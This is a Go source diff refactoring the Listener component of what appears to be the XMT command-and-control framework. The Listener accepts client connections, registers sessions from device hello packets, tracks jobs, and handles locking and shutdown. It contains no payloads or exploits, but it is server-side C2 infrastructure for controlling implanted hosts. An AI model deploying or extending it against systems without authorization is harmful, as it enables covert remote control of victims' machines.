@@ -2,83 +2,89 @@ package c2
 
 import (
 	"context"
+	"io"
 	"net"
-	"sync/atomic"
+	"sync"
 	"time"
 
 	"github.com/PurpleSec/escape"
+	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
-	"github.com/iDigitalFlame/xmt/util/xerr"
 )
-
-// ErrInvalidPacketCount is returned when attempting to read a packet marked
-// as multi or frag an the total count returned is zero.
-var ErrInvalidPacketCount = xerr.New("frag total is zero on a multi or frag packet")
 
 // Listener is a struct that is passed back when a C2 Listener is added to the Server. The Listener struct
 // allows for controlling the Listener and setting callback functions to be used when a client connects,
 // registers or disconnects.
 type Listener struct {
-	connection
 	listener net.Listener
+	connection
 
-	New, Connect func(*Session)
-	Oneshot      func(*com.Packet)
-	ch           chan waker
-	close        chan uint32
+	New     func(*Session)
+	Oneshot func(*com.Packet)
 
-	Receive  func(*Session, *com.Packet)
+	ch       chan waker
+	close    chan uint32
 	sessions map[uint32]*Session
-	name     string
-	//size     uint
-	done uint32
+
+	cancel context.CancelFunc
+	name   string
+	sleep  time.Duration
+	lock   sync.RWMutex
+	state  state
 }
 
 // Wait will block until the current socket associated with this Listener is closed and shutdown.
 func (l *Listener) Wait() {
 	<-l.ch
 }
-func (l *Listener) listen() {
-	if Logging {
-		l.log.Debug("[%s] Starting Listener %q...", l.name, l.listener)
-	}
-	for atomic.LoadUint32(&l.done) == flagOpen {
-		for len(l.close) > 0 {
-			var (
-				i     = <-l.close
-				s, ok = l.sessions[i]
-			)
-			if !ok {
-				continue
+func (l *Listener) prune() {
+	for {
+		select {
+		case <-l.ch:
+			return
+		case <-l.ctx.Done():
+			return
+		case i := <-l.close:
+			l.lock.Lock()
+			if s, ok := l.sessions[i]; ok {
+				if s.Shutdown != nil {
+					l.s.events <- event{s: s, sf: s.Shutdown}
+				}
+				if delete(l.sessions, i); cout.Enabled {
+					l.log.Debug("[%s] Removed closed Session 0x%X.", l.name, i)
+				}
 			}
-			if s.Shutdown != nil {
-				l.s.events <- event{s: s, sFunc: s.Shutdown}
-			}
-			if delete(l.sessions, i); Logging {
-				l.log.Debug("[%s] Removed closed Session 0x%X.", l.name, i)
-			}
+			l.lock.Unlock()
 		}
+	}
+}
+func (l *Listener) listen() {
+	if cout.Enabled {
+		l.log.Info("[%s] Starting Listener %q...", l.name, l.listener)
+	}
+	go l.prune()
+	for {
 		select {
 		case <-l.ctx.Done():
-			atomic.StoreUint32(&l.done, flagClose)
+			l.state.Set(stateClosing)
 		default:
 		}
-		if l.done == flagClose {
+		if l.state.Closing() {
 			break
 		}
 		c, err := l.listener.Accept()
 		if err != nil {
-			if l.done > flagOpen {
+			if l.state.Closing() {
 				break
 			}
 			e, ok := err.(net.Error)
 			if ok && e.Timeout() {
 				continue
 			}
-			if Logging {
-				l.log.Error("[%s] Error occurred during Listener accept: %s!", l.name, err.Error())
+			if cout.Enabled {
+				l.log.Error("[%s] Error during Listener accept: %s!", l.name, err)
 			}
 			if ok && !e.Timeout() && !e.Temporary() {
 				break
@@ -88,37 +94,52 @@ func (l *Listener) listen() {
 		if c == nil {
 			continue
 		}
-		if Logging {
-			l.log.Trace("[%s] Received a connection from %q...", l.name, c.RemoteAddr().String())
+		if cout.Enabled {
+			l.log.Trace("[%s] Received a connection from %q..", l.name, c.RemoteAddr())
 		}
-		go l.handle(c)
+		go handle(l.log, c, l, c.RemoteAddr().String())
 	}
-	if Logging {
+	if cout.Enabled {
 		l.log.Debug("[%s] Stopping Listener.", l.name)
 	}
 	for _, v := range l.sessions {
 		v.Close()
 	}
-	l.cancel()
-	close(l.close)
+	if l.cancel(); !l.state.WakeClosed() {
+		l.state.Set(stateWakeClose)
+		close(l.close)
+	}
 	l.listener.Close()
-	atomic.StoreUint32(&l.done, flagFinished)
 	l.s.close <- l.name
+	l.state.Set(stateClosed)
 	close(l.ch)
+}
+func (l *Listener) clientLock() {
+	l.lock.RLock()
 }
 
 // Close stops the operation of the Listener and any Sessions that may be connected. Resources used with this
 // Listener will be freed up for reuse. This function blocks until the listener socket is closed.
 func (l *Listener) Close() error {
-	atomic.StoreUint32(&l.done, flagClose)
+	if l.state.Closed() {
+		return nil
+	}
+	l.state.Set(stateClosing)
+	l.cancel()
 	err := l.listener.Close()
-	l.Wait()
+	<-l.ch
 	return err
+}
+func (l *Listener) clientUnlock() {
+	l.lock.RUnlock()
 }
 
 // IsActive returns true if the Listener is still able to send and receive Packets.
-func (l Listener) IsActive() bool {
-	return l.done == flagOpen
+func (l *Listener) IsActive() bool {
+	return !l.state.Closing()
+}
+func (l *Listener) prefix() string {
+	return l.name
 }
 
 // String returns the Name of this Listener.
@@ -130,77 +151,95 @@ func (l *Listener) String() string {
 func (l *Listener) Address() string {
 	return l.listener.Addr().String()
 }
-func (l *Listener) handle(c net.Conn) {
-	if !l.handlePacket(c, false) {
-		c.Close()
-		return
-	}
-	if Logging {
-		l.log.Debug("[%s] %s: Triggered Channel mode, holding open Channel!", l.name, c.RemoteAddr().String())
-	}
-	for atomic.LoadUint32(&l.done) == flagOpen {
-		if !l.handlePacket(c, true) {
-			break
-		}
-	}
-	if Logging {
-		l.log.Debug("[%s] %s: Closing Channel..", l.name, c.RemoteAddr().String())
-	}
-	c.Close()
-}
-
-// JSON returns the data of this Listener as a JSON blob.
-func (l *Listener) JSON(w *data.Chunk) {
-	if !Logging {
-		return
-	}
-	w.Write([]byte(
-		`{"name":` + escape.JSON(l.name) + `,"address":` + escape.JSON(l.Address()) + `,"sessions":[`,
-	))
-	i := 0
-	for _, v := range l.sessions {
-		if i > 0 {
-			w.WriteUint8(uint8(','))
-		}
-		v.JSON(w)
-		i++
-	}
-	w.Write([]byte(`]}`))
+func (l *Listener) wrapper() Wrapper {
+	return l.w
 }
 
 // Remove removes and closes the Session and releases all it's associated resources. This does not close the
 // Session on the client's end, use the Shutdown function to properly shutdown the client process.
 func (l *Listener) Remove(i device.ID) {
+	if l.state.WakeClosed() {
+		return
+	}
 	l.close <- i.Hash()
+}
+func (l *Listener) clientClear(i uint32) {
+	v, ok := l.sessions[i]
+	if !ok {
+		return
+	}
+	v.chn = nil
+	v.state.Unset(stateChannelProxy)
 }
 
 // Shutdown triggers a remote Shutdown and closure of the Session associated with the Device ID. This will not
 // immediately close a Session. The Session will be removed when the Client acknowledges the shutdown request.
 func (l *Listener) Shutdown(i device.ID) {
+	if l.state.WakeClosed() {
+		return
+	}
+	l.lock.RLock()
 	s, ok := l.sessions[i.Hash()]
-	if !ok {
+	if l.lock.RUnlock(); !ok {
 		return
 	}
 	s.Close()
 }
+func (l *Listener) transform() Transform {
+	return l.t
+}
 
 // Connected returns an array of all the current Sessions connected to this Listener.
 func (l *Listener) Connected() []*Session {
+	if l.state.Closed() || len(l.sessions) == 0 {
+		return nil
+	}
+	l.lock.RLock()
 	d := make([]*Session, 0, len(l.sessions))
 	for _, v := range l.sessions {
 		d = append(d, v)
 	}
+	l.lock.RUnlock()
 	return d
 }
 
-// Context returns the current Listener's context. This function can be useful for canceling running
-// processes when this Listener closes.
-func (l *Listener) Context() context.Context {
-	return l.ctx
+// JSON returns the data of this Listener as a JSON blob.
+func (l *Listener) JSON(w io.Writer) error {
+	if !cout.Enabled {
+		return nil
+	}
+	if _, err := w.Write([]byte(`{"name":` + escape.JSON(l.name) + `,"address":` + escape.JSON(l.Address()))); err != nil {
+		return err
+	}
+	if t, ok := l.listener.(stringer); ok {
+		if _, err := w.Write([]byte(`,"type":` + escape.JSON(t.String()))); err != nil {
+			return err
+		}
+	}
+	if _, err := w.Write([]byte(`,"sessions":[`)); err != nil {
+		return err
+	}
+	i := 0
+	for _, v := range l.sessions {
+		if i > 0 {
+			if _, err := w.Write([]byte{0x2C}); err != nil {
+				return err
+			}
+		}
+		if err := v.JSON(w); err != nil {
+			return err
+		}
+		i++
+	}
+	_, err := w.Write([]byte(`]}`))
+	return err
 }
 
 // MarshalJSON fulfils the JSON Marshaler interface.
 func (l *Listener) MarshalJSON() ([]byte, error) {
+	if !cout.Enabled {
+		return nil, nil
+	}
 	b := buffers.Get().(*data.Chunk)
 	l.JSON(b)
 	d := b.Payload()
@@ -211,244 +250,226 @@ func (l *Listener) MarshalJSON() ([]byte, error) {
 // Session returns the Session that matches the specified Device ID. This function will return nil if
 // no matching Device ID is found.
 func (l *Listener) Session(i device.ID) *Session {
-	if i.Empty() {
+	if i.Empty() || l.state.Closed() {
 		return nil
 	}
-	if s, ok := l.sessions[i.Hash()]; ok {
+	l.lock.RLock()
+	s, ok := l.sessions[i.Hash()]
+	if l.lock.RUnlock(); ok {
 		return s
 	}
 	return nil
 }
-func (l *Listener) handlePacket(c net.Conn, o bool) bool {
-	p, err := readPacket(c, l.w, l.t)
-	if err != nil {
-		if Logging {
-			l.log.Warning("[%s] %s: Error occurred during Packet read: %s!", l.name, c.RemoteAddr().String(), err.Error())
-		}
-		return false
-	}
-	if p.Flags&com.FlagOneshot != 0 {
-		if Logging {
-			l.log.Trace("[%s] %s: Received an Oneshot Packet.", l.name, c.RemoteAddr().String())
-		}
-		notify(l, nil, p)
-		return false
-	}
-	if Logging {
-		l.log.Trace("[%s:%s] Received Packet %q.", l.name, c.RemoteAddr().String(), p)
-	}
-	z := l.resolveTags(c.RemoteAddr().String(), p.Device, o, p.Tags)
-	if p.Flags&com.FlagMultiDevice == 0 && p.Flags&com.FlagProxy == 0 {
-		if s := l.client(c, p, o); s != nil {
-			n, err := s.next(false)
-			if err != nil {
-				if Logging {
-					l.log.Warning("[%s:%s] %s: Received an error retriving Packet data: %s!", l.name, s.Device.ID, s.host, err.Error())
-				}
-				return p.Flags&com.FlagChannel != 0
-			}
-			if len(z) > 0 {
-				if Logging {
-					l.log.Trace("[%s:%s] %s: Resolved Tags added %d Packets!", l.name, s.Device.ID, s.host, len(z))
-				}
-				u := &com.Packet{ID: MvMultiple, Flags: com.FlagMulti | com.FlagMultiDevice}
-				n.MarshalStream(u)
-				for i := 0; i < len(z); i++ {
-					z[i].MarshalStream(u)
-				}
-				u.Flags.SetLen(uint16(len(z) + 1))
-				u.Close()
-				n = u
-			}
-			if Logging {
-				l.log.Trace("[%s:%s] %s: Sending Packet %q to client...", l.name, s.Device.ID, s.host, n.String())
-			}
-			if err = writePacket(c, s.w, s.t, n); err != nil {
-				if Logging {
-					l.log.Warning("[%s:%s] %s: Received an error writing data to client: %s!", l.name, s.Device.ID, s.host, err.Error())
-				}
-				return o
-			}
-		}
-		return p.Flags&com.FlagChannel != 0
-	}
-	x := p.Flags.Len()
-	if x == 0 {
-		if Logging {
-			l.log.Warning("[%s:%s] %s: Received an invalid multi Packet!", l.name, p.Device, c.RemoteAddr().String())
-		}
-		return p.Flags&com.FlagChannel != 0
-	}
-	var (
-		i, t uint16
-		n    *com.Packet
-		m    = &com.Packet{ID: MvMultiple, Flags: com.FlagMulti | com.FlagMultiDevice}
-	)
-	for ; i < x; i++ {
-		n = new(com.Packet)
-		if err := n.UnmarshalStream(p); err != nil {
-			if Logging {
-				l.log.Warning("[%s:%s] %s: Received an error when attempting to read a Packet: %s!", l.name, p.Device, c.RemoteAddr().String(), err.Error())
-			}
-			return p.Flags&com.FlagChannel != 0
-		}
-		if n.Flags&com.FlagOneshot != 0 {
-			if Logging {
-				l.log.Trace("[%s:%s] %s: Received an Oneshot Packet.", l.name, n.Device, c.RemoteAddr().String())
-			}
-			notify(l, nil, n)
-			continue
-		}
-		s := l.client(c, n, o)
-		if s == nil {
-			continue
-		}
-		if r, err := s.next(false); err != nil {
-			if Logging {
-				l.log.Warning("[%s:%s] %s: Received an error retriving Packet data: %s!", l.name, s.Device.ID, s.host, err.Error())
-			}
-		} else {
-			r.MarshalStream(m)
-		}
-		n = nil
-		t++
-	}
-	if len(z) > 0 {
-		if Logging {
-			l.log.Trace("[%s:%s] %s: Resolved Tags added %d Packets!", l.name, p.Device, c.RemoteAddr().String(), len(z))
-		}
-		for i := 0; i < len(z); i++ {
-			z[i].MarshalStream(m)
-		}
-		t += uint16(len(z))
-	}
-	m.Flags.SetLen(t)
-	if m.Close(); Logging {
-		l.log.Trace("[%s:%s] %s: Sending Packet %q to client...", l.name, p.Device, c.RemoteAddr().String(), m.String())
-	}
-	if err := writePacket(c, l.w, l.t, m); err != nil {
-		if Logging {
-			l.log.Warning("[%s:%s] %s: Received an error writing data to client: %s!", l.name, p.Device, c.RemoteAddr().String(), err.Error())
-		}
-	}
-	return p.Flags&com.FlagChannel != 0
+func (l *Listener) clientGet(i uint32) (connHost, bool) {
+	s, ok := l.sessions[i]
+	return s, ok
 }
-func (l *Listener) client(c net.Conn, p *com.Packet, o bool) *Session {
-	if p.Device.Empty() {
+func (l *Listener) clientSet(i uint32, c chan *com.Packet) {
+	v, ok := l.sessions[i]
+	if !ok {
+		return
+	}
+	if v.chn != nil {
+		return
+	}
+	v.state.Set(stateChannelProxy)
+	for v.chn = c; len(v.send) > 0; {
+		select {
+		case c <- (<-v.send):
+		default:
+		}
+	}
+}
+func (l *Listener) notify(h connHost, n *com.Packet) error {
+	if h == nil {
+		return receive(nil, l, n)
+	}
+	s, ok := h.(*Session)
+	if !ok {
 		return nil
 	}
-	if Logging {
-		l.log.Trace("[%s:%s] %s: Received a Packet %q...", l.name, p.Device, c.RemoteAddr().String(), p.String())
+	return receive(s, l, n)
+}
+func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
+	if n.Device.Empty() || l.state.Closing() {
+		return nil, io.ErrClosedPipe
 	}
+	if cout.Enabled {
+		l.log.Debug("[%s:%s] %s: Received a Packet %q..", l.name, n.Device, a, n)
+	}
+	l.lock.RLock()
 	var (
-		i     = p.Device.Hash()
+		i     = n.Device.Hash()
 		s, ok = l.sessions[i]
 	)
-	if !ok {
-		if p.ID != MvHello {
-			if p.Device.Empty() {
-				return nil
+	if l.lock.RUnlock(); !ok {
+		if n.Empty() && n.ID == SvHello {
+			if cout.Enabled {
+				l.log.Error("[%s:%s] %s: Received an empty hello Packet!", l.name, n.Device, a)
 			}
-			if Logging {
-				l.log.Warning("[%s:%s] %s: Received a non-hello Packet from a unregistered client!", l.name, p.Device, c.RemoteAddr().String())
+			return nil, ErrMalformedPacket
+		}
+		if n.ID != SvHello {
+			if cout.Enabled {
+				l.log.Warning("[%s:%s] %s: Received a non-hello Packet from a unregistered client!", l.name, n.Device, a)
 			}
 			var f com.Flag
-			if p.Flags&com.FlagFrag != 0 {
-				f = p.Flags
+			if n.Flags&com.FlagFrag != 0 {
+				f.SetPosition(0)
+				f.SetLen(n.Flags.Len())
+				f.SetGroup(n.Flags.Group())
 			}
-			if err := writePacket(c, l.w, l.t, &com.Packet{ID: MvRegister, Flags: f}); err != nil {
-				if Logging {
-					l.log.Warning("[%s:%s] %s: Received an error writing data to client: %s!", l.name, p.Device, c.RemoteAddr().String(), err.Error())
-				}
-			}
-			return nil
+			return &conn{next: &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}}, nil
 		}
 		s = &Session{
-			ch:      make(chan waker, 1),
-			ID:      p.Device,
-			jobs:    make(map[uint16]*Job),
-			send:    make(chan *com.Packet, 256),
-			recv:    make(chan *com.Packet, 256),
-			frags:   make(map[uint16]*cluster),
-			parent:  l,
-			Created: time.Now(),
-			connection: connection{
-				w:   l.w,
-				t:   l.t,
-				s:   l.s,
-				log: l.log,
-				Mux: l.Mux,
-			},
+			ch:         make(chan waker, 1),
+			ID:         n.Device,
+			jobs:       make(map[uint16]*Job),
+			send:       make(chan *com.Packet, 256),
+			wake:       make(chan waker, 1),
+			frags:      make(map[uint16]*cluster),
+			parent:     l,
+			Created:    time.Now(),
+			connection: connection{w: l.w, t: l.t, s: l.s, log: l.log, ctx: l.ctx},
 		}
-		s.ctx, s.cancel = context.WithCancel(l.ctx)
-		if l.sessions[i] = s; Logging {
-			l.log.Debug("[%s:%s] %s: New client registered as %q hash 0x%X.", l.name, s.ID, c.RemoteAddr().String(), s.ID, i)
+		if l.state.CanRecv() {
+			s.recv = make(chan *com.Packet, 256)
 		}
-	}
-	s.Last = time.Now()
-	s.host = c.RemoteAddr().String()
-	if p.ID == MvHello {
-		if err := s.Device.UnmarshalStream(p); err != nil {
-			if Logging {
-				l.log.Warning("[%s:%s] %s: Received an error reading data from client: %s!", l.name, s.ID, s.host, err.Error())
+		if err := s.Device.UnmarshalStream(n); err != nil {
+			if cout.Enabled {
+				l.log.Error("[%s:%s] %s: Error reading data from client: %s!", l.name, s.ID, a, err)
 			}
-			return nil
+			return nil, err
 		}
-		if Logging {
-			l.log.Trace("[%s:%s] %s: Received client device info: (OS: %s, %s).", l.name, s.ID, s.host, s.Device.OS.String(), s.Device.Version)
+		if cout.Enabled {
+			l.log.Debug("[%s:%s] %s: Received client device info: (OS: %s, %s).", l.name, s.ID, a, s.Device.OS, s.Device.Version)
 		}
-		if p.Flags&com.FlagProxy == 0 {
-			s.send <- &com.Packet{ID: MvComplete, Device: p.Device, Job: p.Job}
+		l.lock.Lock()
+		l.sessions[i] = s
+		if l.lock.Unlock(); cout.Enabled {
+			l.log.Info("[%s:%s] %s: New client registered as %q (0x%X).", l.name, s.ID, a, s.ID, i)
 		}
-		if l.New != nil {
-			l.s.events <- event{s: s, sFunc: l.New}
-		}
-		if err := notify(l, s, p); err != nil {
-			if Logging {
-				l.log.Warning("[%s:%s] %s: Received an error processing Packet data: %s!", l.name, s.ID, c.RemoteAddr().String(), err.Error())
-			}
-		}
-		return s
 	}
-	if l.Connect != nil && !o {
-		l.s.events <- event{s: s, sFunc: l.Connect}
-	}
-	if err := notify(l, s, p); err != nil {
-		if Logging {
-			l.log.Warning("[%s:%s] %s: Received an error processing Packet data: %s!", l.name, s.ID, c.RemoteAddr().String(), err.Error())
+	if s.sleep == 0 && ok {
+		switch {
+		case !s.Last.IsZero():
+			s.sleep = time.Since(s.Last)
+		case !s.Created.IsZero():
+			s.sleep = time.Since(s.Created)
 		}
-		return nil
 	}
-	return s
+	if s.Last, s.host = time.Now(), a; !ok {
+		if n.Flags&com.FlagProxy == 0 {
+			s.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
+		}
+		switch {
+		case l.New != nil:
+			l.s.events <- event{s: s, sf: l.New}
+		case l.s.New != nil:
+			l.s.events <- event{s: s, sf: l.s.New}
+		}
+	}
+	c, err := l.resolve(s, a, n.Tags)
+	if err != nil {
+		return nil, err
+	}
+	if err = c.process(l.log, l, a, n, false); err != nil {
+		return nil, err
+	}
+	return c, nil
 }
-func (l *Listener) resolveTags(a string, i device.ID, o bool, t []uint32) []*com.Packet {
-	var p []*com.Packet
-	for x := 0; x < len(t); x++ {
-		if Logging {
-			l.log.Trace("[%s:%s] %s: Received a Tag 0x%X...", l.name, i, a, t[x])
-		}
-		s, ok := l.sessions[t[x]]
-		if !ok {
-			if Logging {
-				l.log.Warning("[%s:%s] %s: Received an invalid Tag 0x%X!", l.name, i, a, t[x])
-			}
-			continue
-		}
-		s.host, s.Last = a, time.Now()
-		if l.Connect != nil && !o {
-			l.s.events <- event{s: s, sFunc: l.Connect}
-		}
-		n, err := s.next(true)
-		if err != nil {
-			if Logging {
-				l.log.Warning("[%s:%s] %s: Received an error retriving Packet data: %s!", l.name, i, a, err.Error())
-			}
-			continue
-		}
-		if n == nil {
-			continue
-		}
-		p = append(p, n)
+func (l *Listener) resolve(s *Session, a string, t []uint32) (*conn, error) {
+	if len(t) == 0 {
+		return &conn{host: s}, nil
 	}
-	return p
+	c := &conn{
+		add:  make([]*com.Packet, 0, len(t)),
+		subs: make(map[uint32]bool, len(t)),
+		host: s,
+	}
+	return c, c.resolve(l.log, s, l, a, t, false)
+}
+func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *com.Packet, error) {
+	if n.Device.Empty() || l.state.Closing() {
+		return nil, 0, nil, io.ErrShortBuffer
+	}
+	if cout.Enabled {
+		l.log.Trace("[%s:%s/M] %s: Received a Packet %q..", l.name, n.Device, a, n)
+	}
+	l.lock.RLock()
+	var (
+		i     = n.Device.Hash()
+		s, ok = l.sessions[i]
+	)
+	if l.lock.RUnlock(); !ok {
+		if n.ID != SvHello {
+			if cout.Enabled {
+				l.log.Warning("[%s:%s/M] %s: Received a non-hello Packet from a unregistered client!", l.name, n.Device, a)
+			}
+			var f com.Flag
+			if n.Flags&com.FlagFrag != 0 {
+				f.SetPosition(0)
+				f.SetLen(n.Flags.Len())
+				f.SetGroup(n.Flags.Group())
+			}
+			return nil, 0, &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}, nil
+		}
+		s = &Session{
+			ch:         make(chan waker, 1),
+			ID:         n.Device,
+			jobs:       make(map[uint16]*Job),
+			send:       make(chan *com.Packet, 256),
+			wake:       make(chan waker, 1),
+			frags:      make(map[uint16]*cluster),
+			parent:     l,
+			Created:    time.Now(),
+			connection: connection{w: l.w, t: l.t, s: l.s, log: l.log, ctx: l.ctx},
+		}
+		if l.state.CanRecv() {
+			s.recv = make(chan *com.Packet, 256)
+		}
+		if err := s.Device.UnmarshalStream(n); err != nil {
+			if cout.Enabled {
+				l.log.Error("[%s:%s/M] %s: Error reading data from client: %s!", l.name, s.ID, a, err)
+			}
+			return nil, 0, nil, err
+		}
+		if cout.Enabled {
+			l.log.Debug("[%s:%s/M] %s: Received client device info: (OS: %s, %s).", l.name, s.ID, a, s.Device.OS, s.Device.Version)
+		}
+		l.lock.Lock()
+		l.sessions[i] = s
+		if l.lock.Unlock(); cout.Enabled {
+			l.log.Info("[%s:%s/M] %s: New client registered as %q (0x%X).", l.name, s.ID, a, s.ID, i)
+		}
+	}
+	if s.sleep == 0 && ok {
+		switch {
+		case !s.Last.IsZero():
+			s.sleep = time.Since(s.Last)
+		case !s.Created.IsZero():
+			s.sleep = time.Since(s.Created)
+		}
+	}
+	if s.Last, s.host = time.Now(), a; !ok {
+		if n.Flags&com.FlagProxy == 0 {
+			s.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
+		}
+		switch {
+		case l.New != nil:
+			l.s.events <- event{s: s, sf: l.New}
+		case l.s.New != nil:
+			l.s.events <- event{s: s, sf: l.s.New}
+		}
+	}
+	if err := receive(s, l, n); err != nil {
+		if cout.Enabled {
+			l.log.Error("[%s:%s/M] %s: Error processing Packet: %s!", l.name, s.ID, a, err)
+		}
+		return nil, 0, nil, err
+	}
+	if o {
+		return s, i, nil, nil
+	}
+	return s, i, s.next(true), nil
 }
